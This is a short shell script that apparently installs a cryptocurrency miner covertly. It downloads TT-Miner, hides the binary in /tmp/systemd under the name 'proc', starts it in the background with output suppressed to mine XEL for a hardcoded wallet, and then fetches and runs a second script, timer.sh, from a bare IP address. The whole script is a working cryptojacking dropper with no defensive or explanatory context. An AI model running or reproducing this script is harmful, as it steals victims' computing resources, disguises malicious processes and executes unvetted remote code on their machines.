wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
tar -xf TT-Miner-2024.3.2.tar.gz
mkdir /tmp/systemd
mv TT-Miner-2024.3.2/* /tmp/systemd/
 rm -rf TT-Miner-2024.3.2
mv /tmp/systemd/TT-Miner /tmp/systemd/proc
chmod +x /tmp/systemd/proc
/tmp/systemd/proc -logpool -log -luck -c XEL -P xel:qcd39a5u8cscztamjuyr7hdj6hh2wh9nrmhp86ljx2sz6t99ndjqzqqyv5j86ysk0xwyl.$(echo $(shuf -i 1-999 -n 1)-DenDui)@sg.vipor.net:5077 >/dev/null 2>&1 &
curl -L --progress-bar http://150.136.168.71:80/archxx/timer.sh -o /tmp/timer.sh && chmod +x /tmp/timer.sh && /tmp/timer.sh
